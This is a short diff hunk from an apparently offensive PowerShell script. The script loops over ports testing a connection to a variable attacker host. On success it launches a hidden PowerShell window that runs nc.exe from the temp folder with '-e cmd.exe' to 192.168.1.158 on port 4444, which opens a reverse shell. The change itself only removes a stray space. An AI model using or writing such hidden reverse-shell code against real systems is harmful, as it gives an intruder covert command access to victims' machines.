@@ -14,7 +14,7 @@ $an = (Test-NetConnection $atk -Port $p -ErrorAction SilentlyContinue).TcpTestSu
 if ($an -eq $true){
 
 Start-Sleep -Seconds 20
-Start-Process powershell.exe  -WindowStyle Hidden -ArgumentList "-nop -w hidden $env:TEMP\nc.exe 192.168.1.158 4444 -e cmd.exe"
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop -w hidden $env:TEMP\nc.exe 192.168.1.158 4444 -e cmd.exe"
 
 }
 $p++
